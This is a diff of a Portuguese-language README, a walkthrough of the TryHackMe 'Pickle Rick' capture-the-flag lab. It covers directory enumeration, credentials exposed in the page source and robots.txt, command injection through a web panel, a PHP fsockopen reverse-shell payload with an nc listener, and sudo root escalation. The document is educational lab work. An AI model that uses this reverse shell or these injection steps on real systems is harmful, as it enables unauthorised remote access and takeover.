@@ -1,220 +1,218 @@
-# CTF-Pickle-Rick-Write-up
-Passo a passo de todos os desafios enfrentados durante o Capture The Flag temático de Rick and Morty da TryHackMe.
+# 🥒 Pickle Rick CTF — TryHackMe  
+## Walkthrough
 
-🥒 Pickle Rick CTF — TryHackMe
+Este repositório contém o **walkthrough completo** do desafio **Pickle Rick**, disponível na plataforma **TryHackMe**.  
+O objetivo do CTF é localizar **três ingredientes (flags)** escondidos no sistema alvo, explorando vulnerabilidades em uma aplicação web e no sistema operacional subjacente.
 
-Walkthrough / Write-up
+Este write-up foi elaborado com foco **educacional**, documentando cada etapa do processo de forma clara e estruturada, seguindo uma metodologia básica de pentest.
 
-📌 Introdução
+---
 
-Este documento apresenta o walkthrough completo do desafio Pickle Rick, disponível na plataforma TryHackMe, detalhando todas as etapas de reconhecimento, enumeração, exploração e escalonamento de privilégios realizadas até a obtenção das três flags (ingredientes).
+## 📌 Informações Gerais
 
-O objetivo do desafio é localizar três ingredientes escondidos no sistema alvo, explorando falhas em uma aplicação web e no sistema operacional subjacente.
+- **Plataforma:** TryHackMe  
+- **Desafio:** Pickle Rick  
+- **Máquina atacante:** Kali Linux  
+- **Conexão:** VPN TryHackMe  
+- **IP do alvo
 
-Toda a atividade foi realizada com fins educacionais, em um ambiente controlado de laboratório.
+---
 
-🧪 Ambiente e Preparação
+## 🎯 Objetivo
 
-Plataforma: TryHackMe
+Encontrar os **3 ingredientes** escondidos no ambiente alvo por meio de:
+- Reconhecimento
+- Enumeração
+- Exploração
+- Escalonamento de privilégios
 
-Máquina atacante: Kali Linux
+---
 
-Conexão: VPN do TryHackMe
+## 🔎 Reconhecimento Inicial
 
-IP do alvo: 10.64.173.82
+O primeiro passo foi verificar se o IP fornecido hospedava alguma aplicação web.
 
-Após estabelecer a conexão VPN com sucesso, iniciei o processo de reconhecimento do alvo.
+Acessando o endereço pelo navegador:
 
-🔎 Reconhecimento Inicial (Reconnaissance)
-
-O primeiro passo foi verificar se o endereço IP hospedava alguma aplicação web.
-
-Ao acessar o IP pelo navegador:
-
-http://10.64.173.82
-
+http://$IP
 
 Foi apresentada uma página simples contendo a frase:
 
-Rick is sup4r cool
+> **Rick is sup4r cool**
 
-📄 Análise do Código-Fonte
+![Página inicial](images/home.png)
 
-Utilizando o recurso View Page Source do navegador, foi identificado o seguinte comentário no código HTML:
+---
 
-Username: R1ckRul3s
+### 📄 Análise do Código-Fonte
 
+Utilizando o recurso **View Page Source** do navegador, foi encontrado o seguinte comentário no HTML:
+"Username: R1ckRul3s"
 
-Isso indicou a possível existência de um sistema de autenticação utilizando esse nome de usuário.
+Isso indicou a possível existência de um sistema de autenticação utilizando esse usuário.
 
-Uma tentativa direta de acessar /login não retornou resposta válida, indicando que a rota poderia estar oculta ou possuir outro nome.
+Tentativas diretas de acesso à rota `/login` não retornaram resposta válida.
 
-🌐 Enumeração de Portas (Nmap)
+---
 
-Para identificar serviços ativos no host, foi realizada uma varredura com Nmap, que revelou:
+## 🌐 Enumeração de Portas (Nmap)
 
-Porta 80 — HTTP
+Para identificar os serviços ativos no host, foi realizada uma varredura de portas, que revelou:
 
-Porta 22 — SSH
+- **Porta 80** — HTTP  
+- **Porta 22** — SSH  
 
 Isso indicou duas superfícies principais de ataque:
+- Aplicação Web
+- Possível acesso remoto via SSH
 
-Uma aplicação web
+---
 
-Um possível acesso remoto via SSH
+## 📁 Enumeração de Diretórios (Gobuster)
 
-📁 Enumeração de Diretórios (Gobuster)
+Com foco na aplicação web, utilizei o **Gobuster** para enumerar diretórios e arquivos ocultos.
 
-Com foco inicial na aplicação web, utilizei o Gobuster para enumerar diretórios ocultos.
+### Enumeração inicial:
+bash
+- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt**
 
-Primeira enumeração:
-gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt
-
-
-Entre os caminhos encontrados, destaque para:
+Entre os caminhos encontrados:
 
 /assets
-
 /index.html
-
 /robots.txt
 
-🤖 Análise do robots.txt
-
 Ao acessar /robots.txt, foi encontrado o seguinte conteúdo:
+**Wubbalubbadubdub**
 
-Wubbalubbadubdub
+Esse valor levantou a hipótese de ser uma senha, possivelmente relacionada ao username identificado anteriormente.
 
+## 🔍 Enumeração Avançada
+Para aprofundar a enumeração, utilizei uma wordlist maior e busquei arquivos com extensão PHP:
 
-Esse valor levantou a hipótese de ser uma senha, possivelmente relacionada ao username descoberto anteriormente.
+- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t 50 -x php**
 
-Tentativas de acesso direto a diretórios protegidos (403) não tiveram sucesso neste momento.
-
-🔍 Enumeração Avançada com Extensões
-
-Para aprofundar a enumeração, foi utilizada uma wordlist maior e adicionada a busca por arquivos PHP:
-
-gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t 50 -x php
-
-
-Observações técnicas:
-
--t 50: aumenta o número de threads (em ambientes reais, deve ser usado com cautela)
-
--x php: busca arquivos com extensão PHP, comum em aplicações web
-
-Novos caminhos encontrados:
+Assim, encontrei novos caminhos:
 
 /portal.php
-
 /denied.php
-
 /login.php
 
-🔐 Autenticação e Acesso ao Portal
+##🔐 Autenticação no Portal
 
 Ao acessar /portal.php, foi apresentada uma tela de login.
 
 Credenciais utilizadas:
 
-Username: R1ckRul3s
+- Username:**R1ckRul3s**
+- Password: **Wubbalubbadubdub**
 
-Password: Wubbalubbadubdub
+O login foi bem-sucedido e revelou um painel de comandos, caracterizando uma vulnerabilidade de Command Injection.
 
-O login foi bem-sucedido e revelou um painel de comandos, caracterizando uma vulnerabilidade de Command Injection / Web Shell, permitindo a execução de comandos Linux diretamente pela aplicação.
+## 🖥️ Exploração do Painel de Comandos
 
-🖥️ Exploração do Painel de Comandos
+Inicialmente, executei:
 
-Inicialmente, foi executado:
-
-ls -a
-
-
-Entre os arquivos listados, estava:
-
-Sup3rS3cretPickl3Ingred.txt
+- **ls -a**
 
 
-Ao tentar visualizar o conteúdo com cat, o comando estava bloqueado. Como alternativa, foi utilizado:
+Entre os arquivos listados estava:
+
+- **Sup3rS3cretPickl3Ingred.txt**
+
+
+O comando cat estava bloqueado. Como alternativa, utilizei:
 
 tac Sup3rS3cretPickl3Ingred.txt
 
 
-✅ Primeira flag obtida com sucesso
+✅ Primeira flag obtida
 
-📄 Arquivo de Dica
+## 📄 Arquivo de Dica
 
-Outro arquivo encontrado foi clue.txt, que continha a seguinte mensagem:
+O arquivo clue.txt continha a seguinte mensagem:
 
 "Look around the file system for the other ingredient."
 
-Isso indicou que os próximos ingredientes não estariam diretamente no diretório atual.
+Isso indicou que os próximos ingredientes estariam em outros diretórios do sistema.
 
-🔁 Reverse Shell (Exploração Avançada)
+## 🔁 Reverse Shell
 
-Para obter um shell mais estável e interativo, foi realizada uma exploração via Reverse Shell, aproveitando a execução remota de comandos.
+Para obter um acesso mais estável e interativo, foi realizada uma exploração via Reverse Shell.
 
 Verificação do Netcat:
-which nc
+**which nc**
+
+Listener na máquina atacante:
+**nc -lvnp 443**
+
+Payload executado:
+**php -r '$sock=fsockopen("IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'**
 
 
-Confirmada a presença do netcat no servidor.
-
-Listener na máquina atacante (Kali):
-nc -lvnp 443
-
-Payload executado na aplicação:
-php -r '$sock=fsockopen("IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-
-Esse payload cria uma conexão TCP reversa utilizando file descriptors, redirecionando a entrada, saída e erros do shell remoto para a máquina atacante.
+Esse payload utiliza redirecionamento de file descriptors para estabelecer uma conexão reversa via TCP.
 
 Após a conexão, executei:
 
-bash -i
+- **bash -i**
 
 
-para tornar o shell totalmente interativo.
+para tornar o shell interativo.
 
-🗂️ Enumeração do Sistema de Arquivos
+## 🗂️ Enumeração do Sistema
 
-A partir do shell, naveguei até:
+Navegando pelo sistema:
 
-cd /home
-
-
-No diretório do usuário Rick, foi encontrado o arquivo second ingredients, que continha a:
-
-✅ Segunda flag
-
-⬆️ Escalonamento de Privilégios
-
-Para verificar permissões elevadas, foi executado:
-
-sudo -l
+- cd /home
 
 
-O resultado indicou que o usuário atual podia executar qualquer comando como root sem senha.
+No diretório do usuário Rick, foi encontrado o arquivo second ingredients.
 
-Com isso, foi possível escalar privilégios facilmente:
+✅ Segunda flag obtida
 
-sudo su -
+### ⬆️ Escalonamento de Privilégios
+
+Para verificar permissões elevadas, executei:
+
+**sudo -l**
+
+
+O resultado indicou que o usuário podia executar qualquer comando como root sem necessidade de senha.
+
+Escalonamento realizado com:
+
+**sudo su -**
 
 🏁 Flag Final
 
-Com acesso root, naveguei até:
+Com acesso root:
 
 cd /root
 
 
-Onde foi encontrado o arquivo:
+Foi encontrado o arquivo:
 
-3rd.txt
+**3rd.txt**
 
 
 ✅ Terceira flag obtida
-🎉 Desafio concluído com sucesso
+Assim, o desafio concluído com sucesso
 
-🧠 Conclusão
+## 🧠 Conclusão
 
-Este desafio foi fundamental para consolidar conceitos práticos de Segurança Ofensiva, proporcionando experiência real em exploração de aplicações web e sistemas Linux.
+Este desafio foi essencial para consolidar conceitos fundamentais de Segurança Ofensiva, proporcionando experiência prática em exploração de aplicações web, sistemas Linux e escalonamento de privilégios.
+
+## 🛠️ Habilidades Desenvolvidas
+
+- Reconhecimento e enumeração de serviços
+- Enumeração de diretórios web
+- Análise de código-fonte HTML
+- Identificação de credenciais expostas
+- Exploração de Command Injection
+- Uso de Reverse Shell
+- Manipulação de file descriptors
+- Enumeração de sistemas Linux
+- Escalonamento de privilégios com sudo
+- Metodologia básica de Pentest
+
+---
